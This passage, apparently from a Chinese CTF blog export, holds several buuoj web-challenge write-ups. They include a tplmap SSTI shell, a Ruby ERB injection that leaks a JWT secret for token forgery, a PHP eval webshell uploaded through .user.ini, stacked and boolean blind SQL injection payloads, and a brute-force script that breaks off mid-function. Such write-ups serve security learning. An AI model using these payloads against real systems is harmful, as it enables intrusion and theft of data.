<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python tplmap.py --os-shell -u http://1d1dc355-381e-4738-97f6-250d797a8aaa.node4.buuoj.cn/?name=*</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">[+] Tplmap 0.5</span><br><span class="line">    Automatic Server-Side Template Injection Detection and Exploitation Tool</span><br><span class="line"></span><br><span class="line">[+] Testing if GET parameter 'name' is injectable</span><br><span class="line">[+] Smarty plugin is testing rendering with tag '*'</span><br><span class="line">[+] Smarty plugin is testing blind injection</span><br><span class="line">[+] Mako plugin is testing rendering with tag '$&#123;*&#125;'</span><br><span class="line">[+] Mako plugin is testing blind injection</span><br><span class="line">[+] Python plugin is testing rendering with tag 'str(*)'</span><br><span class="line">[+] Python plugin is testing blind injection</span><br><span class="line">[+] Tornado plugin is testing rendering with tag '&#123;&#123;*&#125;&#125;'</span><br><span class="line">[+] Tornado plugin is testing blind injection</span><br><span class="line">[+] Jinja2 plugin is testing rendering with tag '&#123;&#123;*&#125;&#125;'</span><br><span class="line">[+] Jinja2 plugin has confirmed injection with tag '&#123;&#123;*&#125;&#125;'</span><br><span class="line">[+] Tplmap identified the following injection point:</span><br><span class="line"></span><br><span class="line">  GET parameter: name</span><br><span class="line">  Engine: Jinja2</span><br><span class="line">  Injection: &#123;&#123;*&#125;&#125;</span><br><span class="line">  Context: text</span><br><span class="line">  OS: posix-linux</span><br><span class="line">  Technique: render</span><br><span class="line">  Capabilities:</span><br><span class="line"></span><br><span class="line">   Shell command execution: ok</span><br><span class="line">   Bind and reverse shell: ok</span><br><span class="line">   File write: ok</span><br><span class="line">   File read: ok</span><br><span class="line">   Code evaluation: ok, python code</span><br><span class="line"></span><br><span class="line">[+] Run commands on the operating system.</span><br><span class="line">posix-linux $ ls</span><br><span class="line">application.py</span><br><span class="line">flag.txt</span><br><span class="line">requirements.txt</span><br><span class="line">static</span><br><span class="line">templates</span><br><span class="line">posix-linux $ cat flag.txt</span><br><span class="line">flag&#123;9b69de85-da28-4508-882f-54dd8066bd70&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
        <category>buuoj</category>
      </categories>
      <tags>
        <tag>ssti</tag>
      </tags>
  </entry>
  <entry>
    <title>SCTF2019FlagShop</title>
    <url>/2021/03/12/blog_formal/security/CTF/SCTF2019FlagShop/</url>
    <content><![CDATA[<h1 id="SCTF2019FlagShop"><a href="#SCTF2019FlagShop" class="headerlink" title="SCTF2019FlagShop"></a>SCTF2019FlagShop</h1><p>​    菜鸡的日常练习</p>
<a id="more"></a>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    主要利用的知识点</p>
<ul>
<li><code>robots.txt</code></li>
<li><code>ruby web 注入</code></li>
</ul>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ul>
<li>登录首页</li>
</ul>
<p><img data-src="./SCTF2019FlagShop/1.png" alt></p>
<ul>
<li><code>robots.txt</code>发现代码泄露路径</li>
</ul>
<p><img data-src="./SCTF2019FlagShop/2.png" alt></p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">'sinatra'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'sinatra/cookies'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'sinatra/json'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'jwt'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'securerandom'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'erb'</span></span><br><span class="line"></span><br><span class="line">set <span class="symbol">:public_folder</span>, File.dirname(__FILE_<span class="number">_</span>) + <span class="string">'/static'</span></span><br><span class="line"></span><br><span class="line">FLAGPRICE = <span class="number">1000000000000000000000000000</span></span><br><span class="line">ENV[<span class="string">"SECRET"</span>] = SecureRandom.hex(<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">configure <span class="keyword">do</span></span><br><span class="line">  enable <span class="symbol">:logging</span></span><br><span class="line">  file = File.new(File.dirname(__FILE_<span class="number">_</span>) + <span class="string">'/../log/http.log'</span>,<span class="string">"a+"</span>)</span><br><span class="line">  file.sync = <span class="literal">true</span></span><br><span class="line">  use Rack::CommonLogger, file</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">"/"</span> <span class="keyword">do</span></span><br><span class="line">  redirect <span class="string">'/shop'</span>, <span class="number">302</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">"/filebak"</span> <span class="keyword">do</span></span><br><span class="line">  content_type <span class="symbol">:text</span></span><br><span class="line">  erb IO.binread __FILE_<span class="number">_</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">"/api/auth"</span> <span class="keyword">do</span></span><br><span class="line">  payload = &#123; <span class="symbol">uid:</span> SecureRandom.uuid , <span class="symbol">jkl:</span> <span class="number">20</span>&#125;</span><br><span class="line">  auth = JWT.encode payload,ENV[<span class="string">"SECRET"</span>] , <span class="string">'HS256'</span></span><br><span class="line">  cookies[<span class="symbol">:auth</span>] = auth</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">"/api/info"</span> <span class="keyword">do</span></span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[<span class="symbol">:auth</span>],ENV[<span class="string">"SECRET"</span>] , <span class="literal">true</span>, &#123; <span class="symbol">algorithm:</span> <span class="string">'HS256'</span> &#125;</span><br><span class="line">  json(&#123;<span class="symbol">uid:</span> auth[<span class="number">0</span>][<span class="string">"uid"</span>],<span class="symbol">jkl:</span> auth[<span class="number">0</span>][<span class="string">"jkl"</span>]&#125;)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">"/shop"</span> <span class="keyword">do</span></span><br><span class="line">  erb <span class="symbol">:shop</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">"/work"</span> <span class="keyword">do</span></span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[<span class="symbol">:auth</span>],ENV[<span class="string">"SECRET"</span>] , <span class="literal">true</span>, &#123; <span class="symbol">algorithm:</span> <span class="string">'HS256'</span> &#125;</span><br><span class="line">  auth = auth[<span class="number">0</span>]</span><br><span class="line">  <span class="keyword">unless</span> params[<span class="symbol">:SECRET</span>].<span class="literal">nil</span>?</span><br><span class="line">    <span class="keyword">if</span> ENV[<span class="string">"SECRET"</span>].match(<span class="string">"<span class="subst">#&#123;params[<span class="symbol">:SECRET</span>].match(<span class="regexp">/[0-9a-z]+/</span>)&#125;</span>"</span>)</span><br><span class="line">      puts ENV[<span class="string">"FLAG"</span>]</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> params[<span class="symbol">:do</span>] == <span class="string">"<span class="subst">#&#123;params[<span class="symbol">:name</span>][<span class="number">0</span>,<span class="number">7</span>]&#125;</span> is working"</span> <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">    auth[<span class="string">"jkl"</span>] = auth[<span class="string">"jkl"</span>].to_i + SecureRandom.random_number(<span class="number">10</span>)</span><br><span class="line">    auth = JWT.encode auth,ENV[<span class="string">"SECRET"</span>] , <span class="string">'HS256'</span></span><br><span class="line">    cookies[<span class="symbol">:auth</span>] = auth</span><br><span class="line">    ERB::new(<span class="string">"&lt;script&gt;alert('<span class="subst">#&#123;params[<span class="symbol">:name</span>][<span class="number">0</span>,<span class="number">7</span>]&#125;</span> working successfully!')&lt;/script&gt;"</span>).result</span><br><span class="line"></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">post <span class="string">"/shop"</span> <span class="keyword">do</span></span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[<span class="symbol">:auth</span>],ENV[<span class="string">"SECRET"</span>] , <span class="literal">true</span>, &#123; <span class="symbol">algorithm:</span> <span class="string">'HS256'</span> &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> auth[<span class="number">0</span>][<span class="string">"jkl"</span>] &lt; FLAGPRICE <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">    json(&#123;<span class="symbol">title:</span> <span class="string">"error"</span>,<span class="symbol">message:</span> <span class="string">"no enough jkl"</span>&#125;)</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">    auth &lt;&lt; &#123;<span class="symbol">flag:</span> ENV[<span class="string">"FLAG"</span>]&#125;</span><br><span class="line">    auth = JWT.encode auth,ENV[<span class="string">"SECRET"</span>] , <span class="string">'HS256'</span></span><br><span class="line">    cookies[<span class="symbol">:auth</span>] = auth</span><br><span class="line">    json(&#123;<span class="symbol">title:</span> <span class="string">"success"</span>,<span class="symbol">message:</span> <span class="string">"jkl is good thing"</span>&#125;)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">islogin</span></span></span><br><span class="line">  <span class="keyword">if</span> cookies[<span class="symbol">:auth</span>].<span class="literal">nil</span>? <span class="keyword">then</span></span><br><span class="line">    redirect to(<span class="string">'/shop'</span>)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<ul>
<li>审计发现</li>
</ul>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">get <span class="string">"/work"</span> <span class="keyword">do</span></span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[<span class="symbol">:auth</span>],ENV[<span class="string">"SECRET"</span>] , <span class="literal">true</span>, &#123; <span class="symbol">algorithm:</span> <span class="string">'HS256'</span> &#125;</span><br><span class="line">  auth = auth[<span class="number">0</span>]</span><br><span class="line">  <span class="keyword">unless</span> params[<span class="symbol">:SECRET</span>].<span class="literal">nil</span>?</span><br><span class="line">    <span class="keyword">if</span> ENV[<span class="string">"SECRET"</span>].match(<span class="string">"<span class="subst">#&#123;params[<span class="symbol">:SECRET</span>].match(<span class="regexp">/[0-9a-z]+/</span>)&#125;</span>"</span>)</span><br><span class="line">      puts ENV[<span class="string">"FLAG"</span>]</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> params[<span class="symbol">:do</span>] == <span class="string">"<span class="subst">#&#123;params[<span class="symbol">:name</span>][<span class="number">0</span>,<span class="number">7</span>]&#125;</span> is working"</span> <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">    auth[<span class="string">"jkl"</span>] = auth[<span class="string">"jkl"</span>].to_i + SecureRandom.random_number(<span class="number">10</span>)</span><br><span class="line">    auth = JWT.encode auth,ENV[<span class="string">"SECRET"</span>] , <span class="string">'HS256'</span></span><br><span class="line">    cookies[<span class="symbol">:auth</span>] = auth</span><br><span class="line">    ERB::new(<span class="string">"&lt;script&gt;alert('<span class="subst">#&#123;params[<span class="symbol">:name</span>][<span class="number">0</span>,<span class="number">7</span>]&#125;</span> working successfully!')&lt;/script&gt;"</span>).result</span><br><span class="line"></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>备注：<code>&lt;%=</code>语法可以执行<code>ruby</code>语句， 例如<code>ruby &lt;%= 7 * 7 %&gt;</code></p>
<p><code>$&#39; : The string to the right of the last successful match.</code></p>
<ul>
<li>构造<code>payload</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">GET /work?name=&lt;%=$'%&gt;&amp;do=&lt;%=$'%&gt; is working HTTP/1.1</span><br><span class="line">GET /work?name=%3c%25%3d%24%27%25%3e&amp;do=%3c%25%3d%24%27%25%3e%20is%20working HTTP/1.1</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">secret 7f7f5d5d6d601abf7c3ec4cee7a3243959f562e37dbfffbd4d7acdc29e4fd9d32b0e6a98a364aae8bc324f9efe894fb8f5aa4ba7af31b2533b250d8f1355b2ac</span><br></pre></td></tr></table></figure>

<p><img data-src="./SCTF2019FlagShop/3.png" alt></p>
<ul>
<li><code>jwt</code>解密</li>
</ul>
<p><img data-src="./SCTF2019FlagShop/4.png" alt></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOiI3OGU4ODVjZS1jNzE3LTRjYzktYmQ5Yy1lNzYzNDMzNzlmNWQiLCJqa2wiOjJlKzI3fQ.liIPetfm_asnq6BWAfAf1KJPnp6R_pZKYzIgTGgfXEo</span><br></pre></td></tr></table></figure>

<ul>
<li>修改<code>jwt</code>，放包</li>
</ul>
<p><img data-src="./SCTF2019FlagShop/5.png" alt></p>
<p><img data-src="./SCTF2019FlagShop/6.png" alt></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>buuoj</category>
      </categories>
      <tags>
        <tag>robots.txt</tag>
        <tag>ruby web 注入</tag>
      </tags>
  </entry>
  <entry>
    <title>SUCTF2019CheckIn</title>
    <url>/2021/02/02/blog_formal/security/CTF/SUCTF2019CheckIn/</url>
    <content><![CDATA[<h1 id="SUCTF2019CheckIn"><a href="#SUCTF2019CheckIn" class="headerlink" title="SUCTF2019CheckIn"></a>SUCTF2019CheckIn</h1><p>​    菜鸡的日常练习</p>
<a id="more"></a>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    主要利用的知识点</p>
<ul>
<li>文件上传</li>
<li><code>.user.ini</code>文件</li>
</ul>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ul>
<li>登录首页</li>
</ul>
<p><img data-src="./SUCTF2019CheckIn/1.png" alt></p>
<ul>
<li>上传图片马</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a </span><br><span class="line">&lt;script language=<span class="string">'php'</span>&gt;@<span class="keyword">eval</span>($_REQUEST[<span class="number">4396</span>]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img data-src="./SUCTF2019CheckIn/2.png" alt></p>
<p>发现目录存在<code>index.php</code></p>
<ul>
<li>上传<code>.user.ini</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file=shell.png</span><br></pre></td></tr></table></figure>

<p><img data-src="./SUCTF2019CheckIn/3.png" alt></p>
<ul>
<li>访问<code>webshell</code></li>
</ul>
<p><img data-src="./SUCTF2019CheckIn/4.png" alt></p>
<p><img data-src="./SUCTF2019CheckIn/5.png" alt></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>buuoj</category>
      </categories>
      <tags>
        <tag>文件上传</tag>
        <tag>.user.ini文件</tag>
      </tags>
  </entry>
  <entry>
    <title>SUCTF2019EasySQL</title>
    <url>/2021/01/27/blog_formal/security/CTF/SUCTF2019EasySQL/</url>
    <content><![CDATA[<h1 id="SUCTF2019EasySQL"><a href="#SUCTF2019EasySQL" class="headerlink" title="SUCTF2019EasySQL"></a>SUCTF2019EasySQL</h1><p>​    菜鸡的日常练习</p>
<a id="more"></a>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    主要利用的知识点</p>
<ul>
<li><code>sql</code>注入</li>
</ul>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ul>
<li>登录首页</li>
</ul>
<p><img data-src="./SUCTF2019EasySQL/1.png" alt></p>
<ul>
<li>发现三种情况(nonono，空白，有输出)</li>
</ul>
<p><img data-src="./SUCTF2019EasySQL/2.png" alt></p>
<p><img data-src="./SUCTF2019EasySQL/3.png" alt></p>
<p><img data-src="./SUCTF2019EasySQL/4.png" alt></p>
<ul>
<li>尝试<code>fuzz</code>一波参数</li>
</ul>
<p><img data-src="./SUCTF2019EasySQL/5.png" alt></p>
<ul>
<li>发现存在堆叠注入</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1;show databases;</span><br></pre></td></tr></table></figure>

<p><img data-src="./SUCTF2019EasySQL/6.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1;show tables;</span><br></pre></td></tr></table></figure>

<p><img data-src="./SUCTF2019EasySQL/7.png" alt></p>
<ul>
<li><code>WP</code> </li>
</ul>
<p>后台逻辑 <code>select $_POST[query] || flag from flag</code></p>
<ul>
<li>解法一(非预期解)</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">*,1</span><br></pre></td></tr></table></figure>

<p><img data-src="./SUCTF2019EasySQL/8.png" alt></p>
<ul>
<li>解法二(预期解)</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1;set sql_mode=PIPES_AS_CONCAT;select 1</span><br></pre></td></tr></table></figure>

<p>备注：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wp构造成select 1;set sql_mode=PIPES_AS_CONCAT;select 1 || flag FROM Flag</span><br><span class="line">其中PIPES_AS_CONCAT能将||视为字符串连接符而非或运算符</span><br><span class="line">实际运行为select 1;set sql_mode=PIPES_AS_CONCAT;select "1"+flag from Flag</span><br></pre></td></tr></table></figure>

<p><img data-src="./SUCTF2019EasySQL/9.png" alt></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>buuoj</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>VNCTF2021Ez_game</title>
    <url>/2021/03/19/blog_formal/security/CTF/VNCTF2021Ez_game/</url>
    <content><![CDATA[<h1 id="VNCTF2021Ez-game"><a href="#VNCTF2021Ez-game" class="headerlink" title="VNCTF2021Ez_game"></a>VNCTF2021Ez_game</h1><p>​    菜鸡的日常练习</p>
<a id="more"></a>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    主要利用的知识点</p>
<ul>
<li>前端信息泄露</li>
</ul>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ul>
<li>登录首页</li>
</ul>
<p><img data-src="./VNCTF2021Ez_game/1.png" alt></p>
<ul>
<li>前端代码发现</li>
</ul>
<p><img data-src="./VNCTF2021Ez_game/2.png" alt></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">[<span class="string">'sojson.v4'</span>][<span class="string">"\x66\x69\x6c\x74\x65\x72"</span>][<span class="string">"\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72"</span>]((([<span class="string">'sojson.v4'</span>]+[])[<span class="string">"\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72"</span>][<span class="string">'\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65'</span>][<span class="string">'\x61\x70\x70\x6c\x79'</span>](<span class="literal">null</span>,<span class="string">"118h97x114w32l95m95N101x110O99d111B100u101w32F61P32u39R106k115w106O105F97z109R105f46p99y111A109U39d44F10G32U32F32r32G95V97p32D61Y32X123W125h44r10M32V32P32x32h95X48M120O98J52A56I51A32r61d32v91o34Q95c100n101M99e111I100l101I34b44r32X34r104N116Z116m112B58A47b47P119M119d119M46z115W111I106V115f111s110m46J99D111W109Z47g106R97c118D97F115L99I114Y105F112v116E111l98m102Q117d115E99x97K116r111U114v46s104d116B109F108Z34e93B59q10m40r102O117f110Z99D116D105a111a110u40Y95J48O120H100Q54k52k50e120I49a41P32f123s10E32j32I32d32K95E48D120k100R54S52g50O120H49y91J95q48X120w98C52a56R51E91m48B93c93E32d61e32w95X48v120b98L52e56b51O91m49b93C10Q125V41N40t95r97g41L59X10M118d97I114t32E95f95x79y120f97D50O55p56y49X32I61j32A91K34i34t44h32L34a45m112w97p117H115M101E100z45m34r44g32Q34y87v105k110E33A32h102S108G97y103u123E116k104V105l115E95F103u97g109Y101I95l105R115A95x102G117h110l110E121M33B125f34N44c32q34f71C97L109O101x32c79k118R101J114R33b34L44V32h34U80g114e101b115c115t32c69w115I99g97u112W101z34C44h32d34a120f34k44B32W34i121H34q44x32P34E99x101x110k116J101Z114j34c44B32s34B117V110j100K101A102U105M110L101x100T34k44u32U34R108t111X103q34W44p32M34o21024U38500O34R44T32u34a29256O26412t21495E65292k106N115v20250y23450F34N44f32V34Q26399e24377C31383B65292R34u44t32j34y36824A35831C25903t25345D25105o20204W30340R24037P20316L34R44y32w34o106Z115A106T105F97b34i44a32m34u109T105L46e99p111F109l34U93m59Y10u108S101q116s32P98f105A103l84N101h120n116V32A61B32t95V95W79u120a97z50N55J56g49r91g48C120L48a93r59K10k105U102S32K40X112d97m117q115P101T100A41S32r123R10r32D32a32X32t98Y105Y103N84I101p120j116U32e61J32R95g95v79i120F97F50n55h56H49d91S48x120N49u93H10C125z59O10C105W102e32t40G119n105T110x84r105G109Y101W114q46C73s115m83G101O116j40m41O41R32S123R10c32I32b32A32V98x105X103v84E101b120V116V32L61P32N95e95u79I120v97W50T55W56i49S91j48m120O50d93k10g125J59G10Q105p102m32Y40O112J108s97c121w101U114u46P73a115D68E101Y97D100E40g41g41Q32Y123r10K32X32T32q32r98b105q103i84o101V120D116v32N61H32b95R95J79q120i97q50X55o56g49G91T48Z120F51G93l59k10c32v32f32e32P68u114l97N119q84f101x120z116m40j95r95I79n120R97E50x55o56h49y91p48Q120z52L93g44k32E109H97Q105E110w67Z97l110d118S97M115j83a105B122j101E91p95n95Y79U120S97H50C55a56l49E91z48w120A53C93Y93I32b47M32o50R44R32w109n97U105b110j67h97M110H118j97X115g83D105M122n101W91J95q95y79x120i97R50Y55z56s49N91z48v120R54s93a93S32I47z32A50k32w43S32f56j48j44T32B52Y50c41O10V125M59f10h68n114V97m119f84G101C120P116u40E98i105M103U84C101e120d116q44f32Z109v97i105R110G67u97m110Q118e97n115K83G105V122M101j91Q95Y95y79M120f97G50k55i56C49c91x48j120R53F93a93L32b47p32Z50k44a32l109c97r105A110W67i97Y110t118H97y115J83H105C122r101R91a95L95s79a120d97M50G55H56k49O91m48p120R54y93d93J32x47y32c50c32Y45d32C56M48i44r32b55G50f44j32x95j95r79S120i97g50J55V56a49a91Y48f120w55c93M44M32s50p41D59x59h59g10r40L102e117n110g99S116k105D111t110Y40M95J48s120f53y49N57K55H120Y50z44F32z95B48b120t53z49A57D55X120n51H44w32o95P48t120g53n49M57G55n120T52U44D32B95A48B120Z53K49H57t55X120d53L44f32o95J48R120D53s49H57d55J120b54Y44w32U95u48g120J53Q49v57B55s120a55H41z32L123K10G32X32F32V32W95k48o120T53S49I57d55s120i55d32O61X32n95B95n79d120E97E50s55o56w49j91N48z120D56R93R59j10p32Q32s32e32H95F48O120Y53F49C57W55r120q53M32f61U32Y102R117F110N99c116V105r111y110w40I95X48h120s53Y49o57q55k120o56Q41f32S123S10R32C32B32t32f32r32q32F32Z105Y102S32o40c116E121R112d101G111f102m32p97d108Q101M114s116V32G33s61C61z32B95p48W120e53S49y57p55Q120C55o41q32L123z10I32u32a32y32W32e32b32h32W32s32m32l32c97I108C101N114t116V40P95w48X120x53F49M57d55B120x56u41F10C32F32A32B32h32F32r32y32w125L59G10o32f32T32O32T32O32c32H32D105d102v32H40i116V121a112R101e111G102B32D99O111n110L115o111X108W101S32D33C61H61G32o95u48e120z53k49d57j55s120E55m41p32c123o10V32I32B32R32A32Y32N32H32E32R32l32V32P99D111R110i115r111m108h101D91Z95i95s79g120K97d50W55w56r49n91E48l120W57W93F93R40P95D48G120q53Q49d57p55q120M56R41F10q32C32N32u32X32T32E32d32X125W10D32P32h32i32Y125N59D10v32J32C32X32B95V48w120K53C49I57r55I120E52C32Q61E32X102o117o110I99u116M105C111z110h40v95g48L120b53d49q57e55J120L57j44C32F95R48X120M53S49U57w55h120I50w41W32r123j10q32e32k32e32y32Z32I32g32z114c101D116A117A114V110w32x95p48H120k53O49r57b55Z120w57Q32N43M32A95I48z120M53A49S57s55K120o50o10u32y32k32j32u125a59j10u32S32S32n32p95A48s120k53a49M57F55J120J54G32c61R32l95c48X120C53s49q57U55V120E52N40A95t95T79x120Q97R50o55F56e49Y91i48G120p97P93y44S32J95k48r120q53g49i57E55x120D52O40N95H48S120d53i49M57H55x120e52e40X95k95Z79q120C97l50T55K56I49k91R48o120g98g93Q44v32r95R95K79W120N97u50A55v56Z49m91A48x120X99H93x41y44T32w95n95v79i120g97E50y55h56m49C91X48S120N100w93n41q41b59M10I32e32F32g32e116J114t121I32r123N10M32J32N32m32j32l32J32g32X95n48g120l53X49b57l55D120p50s32b61T32f95W95E101N110o99c111M100M101Q59f10J32k32y32K32B32F32X32R32K105d102c32b40e33U40o116q121j112D101A111D102c32x95p48o120R53a49b57S55d120M50d32p33q61s61o32d95z48B120A53s49S57t55a120j55H32B38S38e32N95i48L120O53j49W57O55V120P50X32o61Y61i61k32P95j48M120Z53O49t57W55P120p52V40d95N95y79a120X97r50t55o56v49a91I48m120m101p93B44T32V95b95j79s120M97q50p55j56G49A91g48i120O102U93G41y41a41i32F123F10O32Z32o32T32P32e32Z32K32T32h32z32d32b95l48V120H53v49J57I55L120w53J40n95M48o120F53C49d57W55e120S54R41U10U32u32C32c32x32z32y32J32F125L10H32K32G32r32d125e32A99A97l116x99y104R32H40B101U41W32j123A10m32t32b32L32A32A32B32D32Z95t48z120m53V49N57N55B120x53Z40m95k48c120A53L49M57V55R120l54U41X10E32R32G32Q32q125U10D125p41P40A123E125S41"</span>[<span class="string">'\x73\x70\x6c\x69\x74'</span>](<span class="regexp">/[a-zA-Z]&#123;1,&#125;/</span>))))(<span class="string">'sojson.v4'</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>破解 <a href="https://jsdec.js.org/" target="_blank" rel="noopener">https://jsdec.js.org/</a></li>
</ul>
<p><img data-src="./VNCTF2021Ez_game/3.png" alt></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>buuoj</category>
      </categories>
      <tags>
        <tag>前端信息泄露</tag>
      </tags>
  </entry>
  <entry>
    <title>WUSTCTF2020颜值成绩查询</title>
    <url>/2021/03/03/blog_formal/security/CTF/WUSTCTF2020%E9%A2%9C%E5%80%BC%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2/</url>
    <content><![CDATA[<h1 id="WUSTCTF2020颜值成绩查询"><a href="#WUSTCTF2020颜值成绩查询" class="headerlink" title="WUSTCTF2020颜值成绩查询"></a>WUSTCTF2020颜值成绩查询</h1><p>​    菜鸡的日常练习</p>
<a id="more"></a>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    主要利用的知识点</p>
<ul>
<li>布尔注入</li>
</ul>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ul>
<li>登录首页</li>
</ul>
<p><img data-src="./WUSTCTF2020%E9%A2%9C%E5%80%BC%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2/1.png" alt></p>
<p>发现布尔注入</p>
<ul>
<li>脚本爆破</li>
<li>表字段</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*- </span></span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">request_url</span><span class="params">(mid, pos)</span>:</span></span><br><span class="line">    <span class="comment"># if ord(test_flag[pos]) &gt;= mid:</span></span><br><span class="line">    <span class="comment">#     return True</span></span><br><span class="line">    <span class="comment"># else:</span></span><br><span class="line">    <span class="comment">#     return False</span></span><br><span class="line">    <span class="comment"># return true false</span></span><br><span class="line">    right_return = <span class="string">r"admin"</span></span><br><span class="line">    temp_data = <span class="string">"http://b4a85959-511e-47dd-a436-55d6e3773263.node3.buuoj.cn/?stunum=(if((ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()),&#123;0&#125;,1))&gt;=&#123;1&#125;),1,0))#"</span>.format(pos,mid)</span><br><span class="line">    <span class="comment"># print(temp_data)</span></span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    res = requests.get(temp_data)</span><br><span class="line">    <span class="keyword">if</span> right_return <span class="keyword">in</span> res.content:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">binarySearch</span><span class="params">(l, r, pos)</span>:</span> </span><br><span class="line">    <span class="keyword">if</span> r &lt; l:</span><br><span class="line">        <span class="comment"># print("final = &#123;&#125;&#123;&#125;".format(l,r))</span></span><br><span class="line">        <span class="keyword">return</span> r</span><br><span class="line">    <span class="comment"># 基本判断</span></span><br><span class="line">    <span class="keyword">if</span> r &gt;= l:</span><br><span class="line">        mid = int(l + (r - l)/<span class="number">2</span>)</span><br><span class="line">        <span class="comment"># print("mid = &#123;&#125;&#123;&#125;".format(l,r))</span></span><br><span class="line">        <span class="comment"># print(mid)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> request_url(mid, pos):</span><br><span class="line">            